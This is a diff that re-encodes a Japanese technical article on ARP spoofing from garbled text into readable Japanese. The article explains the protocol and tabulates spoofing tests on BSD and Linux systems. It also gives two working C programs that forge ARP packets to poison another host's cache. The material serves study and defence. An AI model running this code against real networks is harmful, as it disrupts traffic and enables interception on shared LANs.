@@ -1,31 +1,31 @@
 x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
 x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
 
---- �恛��: ARP�X�v�[�t�B���O�ɂ��Ă̍l�@�Ǝ��� ---
+--- 第○章: ARPスプーフィングについての考察と実装 ---
 
-���ҁFunya
+著者：unya
 
 x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
 x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
 
 
-��0x01.) �͂��߂�
+■0x01.) はじめに
 
-�@ARP�X�v�[�t�B���O�͌Â����炩�瑶�݂��Ă���ɂ��ւ�炸�A���܂��ɗL����
-�U����i�ł��B�L���̐V�����Ƃ���ł́A������C���^�[�l�b�g��2008�N6����AR
-P�X�v�[�t�B���O�U�������o���܂����B
-�@����́AARP�X�v�[�t�B���O�ɂ��čl�@���Ă����A�Ō�Ɏ������@���f�ڂ���
-���B�K���Ȃ��ƂɁA�C���^�[�l�b�g�ɂ�ARP�X�v�[�t�B���O�ɂ��ĉ������T�C
-�g�����������݂��܂��BARP�X�v�[�t�B���O�Ƃ͉����A�Ƃ������Ƃ𗝉����邽��
-�ɂ́A�����̃T�C�g���Q�Ƃ��邱�Ƃ��������߂��܂��B
-�@�����ł́A��̓I��ARP�X�v�[�t�B���O�ɂ��Ẳ���͂��܂���B�����̃c�[
-���ɗ��邱�ƂȂ��A����ARP�X�v�[�t�B���O�c�[�����쐬���A���s���邱�Ƃ�ړI
-�Ƃ���������������Ǝv���܂��B
+　ARPスプーフィングは古くからから存在しているにも関わらず、いまだに有効な
+攻撃手段です。記憶の新しいところでは、さくらインターネットで2008年6月にAR
+Pスプーフィング攻撃が発覚しました。
+　今回は、ARPスプーフィングについて考察していき、最後に実装方法を掲載しま
+す。幸いなことに、インターネットにはARPスプーフィングについて解説するサイ
+トが数多く存在します。ARPスプーフィングとは何か、ということを理解するため
+には、それらのサイトを参照することをおすすめします。
+　ここでは、具体的なARPスプーフィングについての解説はしません。既存のツー
+ルに頼ることなく、自らARPスプーフィングツールを作成し、実行することを目的
+とした解説をしたいと思います。
 
 
-��0x02.) �e�X�g��
+■0x02.) テスト環境
 
-�@�ȉ��̃I�y���[�e�B���O�V�X�e�����g�p���ăe�X�g�����{���܂����B
+　以下のオペレーティングシステムを使用してテストを実施しました。
 
 OpenBSD 4.7 amd64
 FreeBSD 8.1 amd64
@@ -33,27 +33,27 @@ NetBSD 5.1 amd64
 Debian GNU/Linux 5.0.7 amd64
 
 
-��0x03.) ARP�ɂ���
+■0x03.) ARPについて
 
-��3.1 ARP�Ƃ�
+●3.1 ARPとは
 
-�@�C�[�T�l�b�g�Őڑ����ꂽ�l�b�g���[�N�@�퓯�m���ʐM����ɂ�����A�t���[
-���̈���ƂȂ�C���^�t�F�[�X�����肷��̂�48�r�b�g��MAC�A�h���X�ł��B����
-���߁ATCP/IP�𗘗p���ĒʐM���邽�߂ɂ́A�l�b�g���[�N�w�Ŏg�p����_���A�h
-���X�iIP�A�h���X�j�ƃf�[�^�����N�w�Ŏg�p���镨���A�h���X�iMAC�A�h���X�j��
-�}�b�s���O����@�\���K�v�ƂȂ�܂��B���̋@�\��ARP�iAddress Resolution Pr
-otocol�j�Ƃ����܂��B
+　イーサネットで接続されたネットワーク機器同士が通信するにあたり、フレー
+ムの宛先となるインタフェースを決定するのは48ビットのMACアドレスです。その
+ため、TCP/IPを利用して通信するためには、ネットワーク層で使用する論理アド
+レス（IPアドレス）とデータリンク層で使用する物理アドレス（MACアドレス）を
+マッピングする機能が必要となります。この機能をARP（Address Resolution Pr
+otocol）といいます。
 
-��3.2 ARP�L���b�V��
+●3.2 ARPキャッシュ
 
-�@IP�A�h���X��MAC�A�h���X�Ƃ̃}�b�s���O�i�A�h���X�̉����j�������Ȃ���ƁA
-�}�b�s���O��񂪕ێ�����܂��B�����ARP�L���b�V���Ƃ����܂��B�ێ�����鎞
-�Ԃ͎����Ɛݒ�Ɉˑ����܂��B
+　IPアドレスとMACアドレスとのマッピング（アドレスの解決）がおこなわれると、
+マッピング情報が保持されます。これをARPキャッシュといいます。保持される時
+間は実装と設定に依存します。
 
-��3.3 ARP�w�b�_�[�t�H�[�}�b�g
+●3.3 ARPヘッダーフォーマット
 
-�@ARP�p�P�b�g�̍\���𗝉����邽�߂ɁANetBSD��net/arp.h���甲�������\����
-���ɐ������܂��B
+　ARPパケットの構造を理解するために、NetBSDのnet/arp.hから抜粋した構造体
+を例に説明します。
 
 -----
 struct  arphdr {
@@ -96,8 +96,8 @@ struct  arphdr {
 } __packed;
 -----
 
-�@��L�̍\���̂���AARP�p�P�b�g�̃t�H�[�}�b�g���ȉ��̂悤�ɂȂ邱�Ƃ�����
-��܂��B
+　上記の構造体から、ARPパケットのフォーマットが以下のようになることが分か
+ります。
 
  0                   1                   2                   3   
  0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 
@@ -116,136 +116,136 @@ struct  arphdr {
 +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
 
 ar_hrd
-    �n�[�h�E�F�A�A�h���X�̎�ށB�C�[�T�l�b�g�ł����1�ɂȂ�B
+    ハードウェアアドレスの種類。イーサネットであれば1になる。
 ar_pro
-    �ϊ������v���g�R���A�h���X�̎�ށBIPv4�A�h���X��0x0800�ƂȂ�B
+    変換されるプロトコルアドレスの種類。IPv4アドレスは0x0800となる。
 ar_hln
-    �n�[�h�E�F�A�A�h���X�̃T�C�Y���o�C�g�P�ʂŎw�肷��B�C�[�T�l�b�g�Ŏg
-�p����A�h���X��6�o�C�g�ɂȂ�B
+    ハードウェアアドレスのサイズをバイト単位で指定する。イーサネットで使
+用するアドレスは6バイトになる。
 ar_pln
-    �_���A�h���X�̃T�C�Y���o�C�g�P�ʂŎw�肷��BIPv4�A�h���X��4�o�C�g��
-�Ȃ�B
+    論理アドレスのサイズをバイト単位で指定する。IPv4アドレスは4バイトに
+なる。
 ar_op
-    ARP�̓�����w�肷��BARP���N�G�X�g�Ȃ�1�A���v���C�Ȃ�2�ARARP���N�G�X
-�g�Ȃ�3�ARARP���v���C�Ȃ��4�ƂȂ�B
+    ARPの動作を指定する。ARPリクエストなら1、リプライなら2、RARPリクエス
+トなら3、RARPリプライならば4となる。
 ar_sha
-    ���M���n�[�h�E�F�A�A�h���X�BARP�𑗐M����l�b�g���[�N�@���MAC�A�h��
-�X�ƂȂ�B
+    送信元ハードウェアアドレス。ARPを送信するネットワーク機器のMACアドレ
+スとなる。
 ar_spa
-    ���M���v���g�R���A�h���X�BARP�𑗐M����l�b�g���[�N�@���IP�A�h���X��
-����B
+    送信元プロトコルアドレス。ARPを送信するネットワーク機器のIPアドレスが
+入る。
 ar_tha
-    ���M��n�[�h�E�F�A�A�h���X�B���̃t�B�[���h�̓��N�G�X�g�ƃ��v���C�Œl
-���ς��B
-    ARP���N�G�X�g�c00:00:00:00:00:00��������ff:ff:ff:ff:ff:ff
-    ARP���v���C�cARP���N�G�X�g���s�����l�b�g���[�N�@��̃n�[�h�E�F�A�A�h
-���X
+    送信先ハードウェアアドレス。このフィールドはリクエストとリプライで値
+が変わる。
+    ARPリクエスト…00:00:00:00:00:00もしくはff:ff:ff:ff:ff:ff
+    ARPリプライ…ARPリクエストを行ったネットワーク機器のハードウェアアド
+レス
 ar_tpa
-    ���M��v���g�R���A�h���X�B���̃t�B�[���h�̓��N�G�X�g�ƃ��v���C�ňӖ�
-���ς��B
-    ARP���N�G�X�g�c�A�h���X�����������v���g�R���A�h���X
-    ARP���v���C�cARP���N�G�X�g���s�����l�b�g���[�N�@��̃v���g�R���A�h���X
+    送信先プロトコルアドレス。このフィールドはリクエストとリプライで意味
+が変わる。
+    ARPリクエスト…アドレス解決したいプロトコルアドレス
+    ARPリプライ…ARPリクエストを行ったネットワーク機器のプロトコルアドレス
 
 
-��0x04.) 4. ARP�X�v�[�t�B���O�Ƃ�
+■0x04.) 4. ARPスプーフィングとは
 
-�@TCP/IP���C�[�T�l�b�gLAN��ŗ��p���邽�߂ɂ́AIP�A�h���X��MAC�A�h���X��
-�}�b�s���O����K�v�����邱�Ƃ͂��łɐ������܂����BARP�X�v�[�t�B���O�́A��
-�̃}�b�s���O���iARP�L���b�V���j���������܂��B�C�[�T�l�b�g�h���C�o�͏��
-MAC�A�h���X������Ƃ��Ďg�p���邽�߁A�������ꂽ�}�b�s���O�������Ƃ�TCP
-/IP�ʐM�������Ȃ��ƁA���������M��֑��M�ł��Ȃ��Ȃ�܂��B
+　TCP/IPをイーサネットLAN上で利用するためには、IPアドレスとMACアドレスを
+マッピングする必要があることはすでに説明しました。ARPスプーフィングは、こ
+のマッピング情報（ARPキャッシュ）を汚染します。イーサネットドライバは常に
+MACアドレスを宛先として使用するため、汚染されたマッピング情報をもとにTCP
+/IP通信をおこなうと、正しい送信先へ送信できなくなります。
 
-��4.1 ARP�L���b�V���̉���
+●4.1 ARPキャッシュの汚染
 
-�@ARP�L���b�V���̊e�G���g�����X�V�����^�C�~���O�́AARP���v���C����M��
-���ꍇ�݂̂ł͂���܂���BARP�L���b�V����ARP���N�G�X�g����M�����ꍇ�ł�
-�X�V����܂��B
-�@�ȉ��̕\�́AFreeBSD 8.1��Debian GNU/Linux 5.0.7�ɑ΂��ď�����ς��Ȃ���
-ARP�X�v�[�t�B���O�������Ȃ������ʂł��B
+　ARPキャッシュの各エントリが更新されるタイミングは、ARPリプライを受信し
+た場合のみではありません。ARPキャッシュはARPリクエストを受信した場合でも
+更新されます。
+　以下の表は、FreeBSD 8.1とDebian GNU/Linux 5.0.7に対して条件を変えながら
+ARPスプーフィングをおこなった結果です。
 
-�\4.1-1 ARP���N�G�X�g�ɂ��ARP�X�v�[�t�B���O����
+表4.1-1 ARPリクエストによるARPスプーフィング結果
 +--------------------------------------------------------------------------------------------------+-------+
-| ���M��MAC�A�h���X | ar_spa�i���M��IP�j | ar_tpa�i���M��IP�j| FreeBSD                             | Linux |
+| 送信先MACアドレス | ar_spa（送信元IP） | ar_tpa（送信先IP）| FreeBSD                             | Linux |
 +-------------------+--------------------+-------------------+-------------------------------------+-------+
-| �u���[�h�L���X�g  | ARP�L���b�V���ɗL  | ��������          | ar_spa�ɊY������ARP�L���b�V�����X�V | �V    |
+| ブロードキャスト  | ARPキャッシュに有  | 自分宛て          | ar_spaに該当するARPキャッシュを更新 | 〃    |
 |-------------------|--------------------|-------------------|-------------------------------------|-------|
-| �u���[�h�L���X�g  | ARP�L���b�V���ɗL  | ���l����          | ar_spa�ɊY������ARP�L���b�V�����X�V | �V    |
+| ブロードキャスト  | ARPキャッシュに有  | 他人宛て          | ar_spaに該当するARPキャッシュを更新 | 〃    |
 |-------------------|--------------------|-------------------|-------------------------------------|-------|
-| �u���[�h�L���X�g  | ARP�L���b�V���ɖ�  | ��������          | ar_spa��ARP�L���b�V���ɒǉ�         | �V    |
+| ブロードキャスト  | ARPキャッシュに無  | 自分宛て          | ar_spaをARPキャッシュに追加         | 〃    |
 |-------------------|--------------------|-------------------|-------------------------------------|-------|
-| �u���[�h�L���X�g  | ARP�L���b�V���ɖ�  | ���l����          | ����                                | �V    |
+| ブロードキャスト  | ARPキャッシュに無  | 他人宛て          | 無視                                | 〃    |
 |-------------------|--------------------|-------------------|-------------------------------------|-------|
-| ���j�L���X�g      | ARP�L���b�V���ɗL  | ��������          | ar_spa�ɊY������ARP�L���b�V�����X�V | �V    |
+| ユニキャスト      | ARPキャッシュに有  | 自分宛て          | ar_spaに該当するARPキャッシュを更新 | 〃    |
 |-------------------|--------------------|-------------------|-------------------------------------|-------|
-| ���j�L���X�g      | ARP�L���b�V���ɗL  | ���l����          | ar_spa�ɊY������ARP�L���b�V�����X�V | �V    |
+| ユニキャスト      | ARPキャッシュに有  | 他人宛て          | ar_spaに該当するARPキャッシュを更新 | 〃    |
 |-------------------|--------------------|-------------------|-------------------------------------|-------|
-| ���j�L���X�g      | ARP�L���b�V���ɖ�  | ��������          | ar_spa��ARP�L���b�V���ɒǉ�         | �V    |
+| ユニキャスト      | ARPキャッシュに無  | 自分宛て          | ar_spaをARPキャッシュに追加         | 〃    |
 |-------------------|--------------------|-------------------|-------------------------------------|-------|
-| ���j�L���X�g      | ARP�L���b�V���ɖ�  | ���l����          | ����                                | �V    |
+| ユニキャスト      | ARPキャッシュに無  | 他人宛て          | 無視                                | 〃    |
 +----------------------------------------------------------------------------------------------------------+
 
-�\4.1-2 ARP���v���C�ɂ��ARP�X�v�[�t�B���O����
+表4.1-2 ARPリプライによるARPスプーフィング結果
 +----------------------------------------------------------------------------------------------------------+
-| ���M��MAC�A�h���X | ar_spa�i���M��IP�j | ar_tpa�i���M��IP�j| FreeBSD                             | Linux |
+| 送信先MACアドレス | ar_spa（送信元IP） | ar_tpa（送信先IP）| FreeBSD                             | Linux |
 +-------------------+--------------------+-------------------+-------------------------------------+-------+
-| ���j�L���X�g      | ARP�L���b�V���ɗL  | ��������          | ar_spa�ɊY������ARP�L���b�V�����X�V | �V    |
+| ユニキャスト      | ARPキャッシュに有  | 自分宛て          | ar_spaに該当するARPキャッシュを更新 | 〃    |
 |-------------------|--------------------|-------------------|-------------------------------------|-------|
-| ���j�L���X�g      | ARP�L���b�V���ɗL  | ���l����          | ar_spa�ɊY������ARP�L���b�V�����X�V | �V    |
+| ユニキャスト      | ARPキャッシュに有  | 他人宛て          | ar_spaに該当するARPキャッシュを更新 | 〃    |
 |-------------------|--------------------|-------------------|-------------------------------------|-------|
-| ���j�L���X�g      | ARP�L���b�V���ɖ�  | ��������          | ar_spa��ARP�L���b�V���ɒǉ�         | ����  |
+| ユニキャスト      | ARPキャッシュに無  | 自分宛て          | ar_spaをARPキャッシュに追加         | 無視  |
 |-------------------|--------------------|-------------------|-------------------------------------|-------|
-| ���j�L���X�g      | ARP�L���b�V���ɖ�  | ���l����          | ����                                | �V    |
+| ユニキャスト      | ARPキャッシュに無  | 他人宛て          | 無視                                | 〃    |
 +----------------------------------------------------------------------------------------------------------+
 
-�@FreeBSD��Linux�̋����̈Ⴂ�́AARP���v���C�ɂ��X�v�[�t�B���O���ʂɕ\��
-�Ă��܂��BLinux�͎��g��ARP���N�G�X�g�ɑ΂��郊�v���C�̂ݎ󂯓���܂��B
-�@���ɁAFreeBSD�ȊO��BSD�̋����𒲂ׂ邽�߁AFreeBSD��Linux�ňႢ�̌��ꂽ
-�p�����[�^�[���g�p���A�eBSD�ɑ΂���ARP���N�G�X�g��ARP���v���C�ɂ��X�v�[
-�t�B���O�����s���܂����B
+　FreeBSDとLinuxの挙動の違いは、ARPリプライによるスプーフィング結果に表れ
+ています。Linuxは自身のARPリクエストに対するリプライのみ受け入れます。
+　次に、FreeBSD以外のBSDの挙動を調べるため、FreeBSDとLinuxで違いの現れた
+パラメーターを使用し、各BSDに対してARPリクエストとARPリプライによるスプー
+フィングを実行しました。
 
-�\4.1-3 ARP���N�G�X�g�ɂ��ARP�X�v�[�t�B���O��
+表4.1-3 ARPリクエストによるARPスプーフィング可否
 +--------------------------------------+
-| �^�[�Q�b�gOS     | �o�[�W���� | ���� |
+| ターゲットOS     | バージョン | 結果 |
 +------------------+------------+------+
-| NetBSD           | 5.1        | ��   |
-| FreeBSD          | 8.1        | ��   |
-| OpenBSD          | 4.7        | ��   |
-| Debian GNU/Linux | 5.0.7      | ��   |
+| NetBSD           | 5.1        | ○   |
+| FreeBSD          | 8.1        | ○   |
+| OpenBSD          | 4.7        | ○   |
+| Debian GNU/Linux | 5.0.7      | ○   |
 +--------------------------------------+
 
-�\4.1-4 ARP���v���C�ɂ��ARP�X�v�[�t�B���O��
+表4.1-4 ARPリプライによるARPスプーフィング可否
 +--------------------------------------+
-| �^�[�Q�b�gOS     | �o�[�W���� | ���� |
+| ターゲットOS     | バージョン | 結果 |
 +------------------+------------+------+
-| NetBSD           | 5.1        | ��   |
-| FreeBSD          | 8.1        | ��   |
-| OpenBSD          | 4.7        | ��   |
-| Debian GNU/Linux | 5.0.7      | �~   |
+| NetBSD           | 5.1        | ○   |
+| FreeBSD          | 8.1        | ○   |
+| OpenBSD          | 4.7        | ○   |
+| Debian GNU/Linux | 5.0.7      | ×   |
 +--------------------------------------+
 
-�@�eBSD�ɋ����̈Ⴂ�͌���Ă��炸�ALinux�ł̂�ARP���v���C�ɂ��ARP�X�v�[
-�t�B���O�Ɏ��s���Ă��܂��B
-�@���̌��ʂ���AARP�X�v�[�t�B���O�̎��s�ɂ́A���M��MAC�A�h���X�Ƀ��j�L��
-�X�g���g�p����ARP���N�G�X�g�ɂ����@���K���Ă���ƍl���܂��B
-�@���M��MAC�A�h���X�Ƀ��j�L���X�g���g�p����̂́A�u���[�h�L���X�g���g�p��
-��ƃu���[�h�L���X�g�h���C���S�̂ɉe�����y�ڂ����߂ł��B
+　各BSDに挙動の違いは現れておらず、LinuxでのみARPリプライによるARPスプー
+フィングに失敗しています。
+　この結果から、ARPスプーフィングの実行には、送信先MACアドレスにユニキャ
+ストを使用したARPリクエストによる方法が適していると考えます。
+　送信先MACアドレスにユニキャストを使用するのは、ブロードキャストを使用す
+るとブロードキャストドメイン全体に影響を及ぼすためです。
 
 
-��0x05.) ARP�X�v�[�t�B���O�̎���
+■0x05.) ARPスプーフィングの実装
 
-�@BSD��Linux�ɂ�����ARP�p�P�b�g���M�̂��߂̃T���v���R�[�h���f�ڂ��܂��B
-����̃e�X�g�Ɏg�p����ARP�X�v�[�t�B���O�c�[���́A�ڂ��̃T�C�g�ɒu���Ă���
-�܂��B
+　BSDとLinuxにおけるARPパケット送信のためのサンプルコードを掲載します。
+今回のテストに使用したARPスプーフィングツールは、ぼくのサイトに置いてあり
+ます。
 
-��5.1 BSD�R�[�h
+●5.1 BSDコード
 
 -----
 /*
  * bsdarpsend.c
  *
- * BSD��ARP���M���s�����߂̃T���v���v���O�����ł�
- * �G���[�`�F�b�N�͏ȗ����Ă��܂�
- * FreeBSD 8.1 amd64/OpenBSD 4.7 amd64/NetBSD 5.1 amd64�ŃR���p�C���E����̊m�F�������Ȃ��܂���
+ * BSDでARP送信を行うためのサンプルプログラムです
+ * エラーチェックは省略しています
+ * FreeBSD 8.1 amd64/OpenBSD 4.7 amd64/NetBSD 5.1 amd64でコンパイル・動作の確認をおこないました
  */
  
 #include <sys/ioctl.h>
@@ -270,31 +270,31 @@ ARP�X�v�[�t�B���O�������Ȃ������ʂł��B
 #include <stdlib.h>
 #include <stdio.h>
 
-/* ���M�Ɏg�p����C���^�t�F�[�X	*/
+/* 送信に使用するインタフェース	*/
 char *interface = "em0";
 
-/* ���M�Ɏg�p����f�o�C�X */
+/* 送信に使用するデバイス */
 char *bpf = "/dev/bpf0";
 /*
- * ���M��MAC�A�h���X
- * ARP�X�v�[�t�B���O�������Ȃ��ƁAARP�L���b�V���ɂ���MAC�A�h���X���o�^����܂�
+ * 送信元MACアドレス
+ * ARPスプーフィングをおこなうと、ARPキャッシュにこのMACアドレスが登録されます
  */
 char *src_mac = "00:00:33:44:55:66";
 /*
- * ���M��IP�A�h���X
- * ARP�X�v�[�t�B���O�������Ȃ��ƁAARP�L���b�V���ɂ���IP�A�h���X���o�^����܂�
+ * 送信元IPアドレス
+ * ARPスプーフィングをおこなうと、ARPキャッシュにこのIPアドレスが登録されます
  */
 char *src_ip = "192.168.2.2";
 
 /*
- * ���M��MAC�A�h���X
- * ���M��ɍ��킹�ďC�����Ă�������
- * �u���[�h�L���X�g��ARP�X�v�[�t�B���O�����s����ƃu���[�h�L���X�g�h���C���S�̂ɉe�����܂�
+ * 送信先MACアドレス
+ * 送信先に合わせて修正してください
+ * ブロードキャストでARPスプーフィングを実行するとブロードキャストドメイン全体に影響します
  */
 char *dst_mac = "ff:ff:ff:ff:ff:ff";
 /*
- * ���M��IP�A�h���X
- * ARP���N�G�X�g�̏ꍇ�͖₢���킹��IP�A�h���X�ɂȂ�܂�
+ * 送信先IPアドレス
+ * ARPリクエストの場合は問い合わせるIPアドレスになります
  */
 char *dst_ip = "192.168.2.1";
 
@@ -325,12 +325,12 @@ main(int argc, char *argv[])
   struct ifreq ifr;
 
   /*
-   * ���M�Ɏg�p���邽�߂�BPF�f�o�C�X���J��
+   * 送信に使用するためのBPFデバイスを開く
    */
   if ((sd = open(bpf, O_RDWR, 0)) < 0)
     err(EXIT_FAILURE, "open");
   /*
-   * /dev/bpfXX �ƃl�b�g���[�N�C���^�t�F�[�X��R�t����
+   * /dev/bpfXX とネットワークインタフェースを紐付ける
    */
   memset(&ifr, 0, sizeof(struct ifreq));
   strlcpy(ifr.ifr_name, interface, sizeof(ifr.ifr_name));
@@ -338,15 +338,15 @@ main(int argc, char *argv[])
     err(EXIT_FAILURE, "ioctl");
 
   /*
-   * �z�X�g��/IP�A�h���X���o�C�i���ɕϊ�
-   * �G���[�`�F�b�N�͏ȗ����Ă��܂�
+   * ホスト名/IPアドレスをバイナリに変換
+   * エラーチェックは省略しています
    */
   resolve(src_ip, &src_addr);
   resolve(dst_ip, &dst_addr);
 
   /*
-   * �C�[�T�l�b�g�w�b�_�[�̍쐬
-   * ether_aton()�̃G���[�`�F�b�N�͏ȗ����Ă��܂�
+   * イーサネットヘッダーの作成
+   * ether_aton()のエラーチェックは省略しています
    */
   eth = (struct ether_header *)arpbuf;
   memcpy(eth->ether_dhost, ether_aton(dst_mac), sizeof(eth->ether_dhost));
@@ -354,15 +354,15 @@ main(int argc, char *argv[])
   eth->ether_type = htons(ETHERTYPE_ARP);
 
   /*
-   * ARP�w�b�_�[�̍쐬
+   * ARPヘッダーの作成
    */
   arp = (struct ether_arp *)(arpbuf + sizeof(struct ether_header));
-  arp->arp_hrd = htons(ARPHRD_ETHER);    /* �n�[�h�E�F�A�A�h���X�̎�� */
-  arp->arp_pro = htons(ETHERTYPE_IP);    /* �_���A�h���X�̎��         */
-  arp->arp_hln = ETHER_ADDR_LEN;         /* MAC�A�h���X�̃T�C�Y        */
-  arp->arp_pln = sizeof(struct in_addr); /* �_���A�h���X�̃T�C�Y       */
-  arp->arp_op = htons(ARPOP_REQUEST);    /* ARP���N�G�X�g              */
-  /* ARP�y�C���[�h���� */
+  arp->arp_hrd = htons(ARPHRD_ETHER);    /* ハードウェアアドレスの種類 */
+  arp->arp_pro = htons(ETHERTYPE_IP);    /* 論理アドレスの種類         */
+  arp->arp_hln = ETHER_ADDR_LEN;         /* MACアドレスのサイズ        */
+  arp->arp_pln = sizeof(struct in_addr); /* 論理アドレスのサイズ       */
+  arp->arp_op = htons(ARPOP_REQUEST);    /* ARPリクエスト              */
+  /* ARPペイロード部分 */
   memcpy(arp->arp_sha, eth->ether_shost, sizeof(arp->arp_sha));
   memcpy(arp->arp_tha, eth->ether_dhost, sizeof(arp->arp_tha));
   memcpy(arp->arp_spa, &src_addr, sizeof(arp->arp_spa));
@@ -380,15 +380,15 @@ main(int argc, char *argv[])
 }
 -----
 
-��5.2 Linux�R�[�h
+●5.2 Linuxコード
 
 -----
 /*
  * linarpsend.c
  *
- * linux��ARP���M�������Ȃ����߂̃T���v���v���O�����ł�
- * �G���[�`�F�b�N�͏ȗ����Ă��܂�
- * Debian GNU/Linux 5.0.7 amd64�ŃR���p�C���E����̊m�F�������Ȃ��܂���
+ * linuxでARP送信をおこなうためのサンプルプログラムです
+ * エラーチェックは省略しています
+ * Debian GNU/Linux 5.0.7 amd64でコンパイル・動作の確認をおこないました
  */
 
 #include <sys/types.h>
@@ -404,28 +404,28 @@ main(int argc, char *argv[])
 #include <string.h>
 #include <netdb.h>
 
-/* ���M�Ɏg�p����C���^�t�F�[�X */
+/* 送信に使用するインタフェース */
 char *interface = "eth0";
 /*
- * ���M��MAC�A�h���X
- * ARP�X�v�[�t�B���O�������Ȃ��ƁAARP�L���b�V���ɂ���MAC�A�h���X���o�^����܂�
+ * 送信元MACアドレス
+ * ARPスプーフィングをおこなうと、ARPキャッシュにこのMACアドレスが登録されます
  */
 char *src_mac = "00:00:33:44:55:66";
 /*
- * ���M��IP�A�h���X
- * ARP�X�v�[�t�B���O�������Ȃ��ƁAARP�L���b�V���ɂ���IP�A�h���X���o�^����܂�
+ * 送信元IPアドレス
+ * ARPスプーフィングをおこなうと、ARPキャッシュにこのIPアドレスが登録されます
  */
 char *src_ip = "192.168.2.2";
 
 /*
- * ���M��MAC�A�h���X
- * ���M��ɍ��킹�ďC�����Ă�������
- * �u���[�h�L���X�g��ARP�X�v�[�t�B���O�����s����ƃu���[�h�L���X�g�h���C���S�̂ɉe�����܂�
+ * 送信先MACアドレス
+ * 送信先に合わせて修正してください
+ * ブロードキャストでARPスプーフィングを実行するとブロードキャストドメイン全体に影響します
  */
 char *dst_mac = "ff:ff:ff:ff:ff:ff";
 /*
- * ���M��IP�A�h���X
- * ARP���N�G�X�g�̏ꍇ�͖₢���킹��IP�A�h���X�ɂȂ�܂�
+ * 送信先IPアドレス
+ * ARPリクエストの場合は問い合わせるIPアドレスになります
  */
 char *dst_ip = "192.168.2.1";
 
@@ -456,22 +456,22 @@ main(int argc, char *argv[])
   socklen_t tolen = sizeof(struct sockaddr);
 
   /* 
-   * �Â������ł�
-   * ���݂�packet(7)����������Ă��܂�
+   * 古い実装です
+   * 現在はpacket(7)が推奨されています
    */
   if ((sd = socket(PF_PACKET, SOCK_PACKET, htons(ETH_P_ALL))) < 0)
     err(EXIT_FAILURE, "socket");
 
   /*
-   * �z�X�g��/IP�A�h���X���o�C�i���ɕϊ�
-   * �G���[�`�F�b�N�͏ȗ����Ă��܂�
+   * ホスト名/IPアドレスをバイナリに変換
+   * エラーチェックは省略しています
    */
   resolve(src_ip, &src_addr);
   resolve(dst_ip, &dst_addr);
 
   /*
-   * �C�[�T�l�b�g�w�b�_�[�̍쐬
-   * ether_aton_r()�̃G���[�`�F�b�N�͏ȗ����Ă��܂�
+   * イーサネットヘッダーの作成
+   * ether_aton_r()のエラーチェックは省略しています
    */
   eth = (struct ether_header *)arpbuf;
   ether_aton_r(dst_mac, eth->ether_dhost);
@@ -479,15 +479,15 @@ main(int argc, char *argv[])
   eth->ether_type = htons(ETHERTYPE_ARP);
 
   /*
-   * ARP�w�b�_�[�̃p���[���[�^�[��net/if_arp.h���Q��
+   * ARPヘッダーのパラーメーターはnet/if_arp.hを参照
    */
   arp = (struct ether_arp *)(arpbuf + sizeof(struct ether_header));
-  arp->arp_hrd = htons(ARPHRD_ETHER);    /* �n�[�h�E�F�A�A�h���X�̎�� */
-  arp->arp_pro = htons(ETHERTYPE_IP);    /* �_���A�h���X�̎��         */
-  arp->arp_hln = ETH_ALEN;               /* MAC�A�h���X�̃T�C�Y        */
-  arp->arp_pln = sizeof(struct in_addr); /* �_���A�h���X�̃T�C�Y       */
-  arp->arp_op = htons(ARPOP_REQUEST);    /* ARP���N�G�X�g              */
-  /* ARP�y�C���[�h���� */
+  arp->arp_hrd = htons(ARPHRD_ETHER);    /* ハードウェアアドレスの種類 */
+  arp->arp_pro = htons(ETHERTYPE_IP);    /* 論理アドレスの種類         */
+  arp->arp_hln = ETH_ALEN;               /* MACアドレスのサイズ        */
+  arp->arp_pln = sizeof(struct in_addr); /* 論理アドレスのサイズ       */
+  arp->arp_op = htons(ARPOP_REQUEST);    /* ARPリクエスト              */
+  /* ARPペイロード部分 */
   memcpy(arp->arp_sha, eth->ether_shost, sizeof(arp->arp_sha));
   memcpy(arp->arp_tha, eth->ether_dhost, sizeof(arp->arp_tha));
   memcpy(arp->arp_spa, &src_addr, sizeof(arp->arp_spa));
@@ -509,48 +509,48 @@ main(int argc, char *argv[])
 }
 -----
 
-��5.3 BSD��Linux�ł̎����̈Ⴂ
+●5.3 BSDとLinuxでの実装の違い
 
-�@�f�o�C�X�h���C�o���x���Ő��̃p�P�b�g�𑗐M����ɂ�����ABSD��Linux�̎�
-���̈Ⴂ�́A�ȉ���2�_�ł��B
+　デバイスドライバレベルで生のパケットを送信するにあたり、BSDとLinuxの実
+装の違いは、以下の2点です。
 
-�EBSD��BPF���g�p����̂ɑ΂��āALinux�̓\�P�b�g���g�p����B
-�EBSD��write(2)���g�p���đ��M����̂ɑ΂��āALinux��sendto(2)���g�p����B
-
-
-��0x06.) �Ō��
-
-�@ARP�X�v�[�t�B���O�́A���ꎩ�̂ł͒ʐM�W�Q�������N�����݂̂ł��B��������
-��ARP�L���b�V�����Q�Ƃ��đ��M������肵���t���[���́A���������M��֌�����
-�Ȃ����߂ł��BARP�X�v�[�t�B���O�́A�����܂ł��{�i�I�ȍU���̂��߂̑�����
-�߂��܂���B������C���^�[�l�b�g�ł�web�T�[�o�[����̉����p�P�b�g��������
-�iiframe�^�O�̑}���j����܂����B���̂悤�ȍU���𐬗������邽�߂ɂ́AARP�X
-�v�[�t�B���O��p�P�b�g�̉�����ȊO�ɂ��菇���K�v�ƂȂ�܂��B������ARP�X
-�v�[�t�B���O�Ƃ͂܂��ʂ̃e�N�j�b�N���K�v�ƂȂ�A�U�����e�ɂ���Ă͓�Փx
-���オ��܂��B
-�@�ڍׂȍU���菇��e�N�j�b�N�ɂ��Ẳ���́A�܂��ʂ̋@��ɂƂ��Ă�����
-�Ƃɂ��܂��B
+・BSDがBPFを使用するのに対して、Linuxはソケットを使用する。
+・BSDがwrite(2)を使用して送信するのに対して、Linuxはsendto(2)を使用する。
 
 
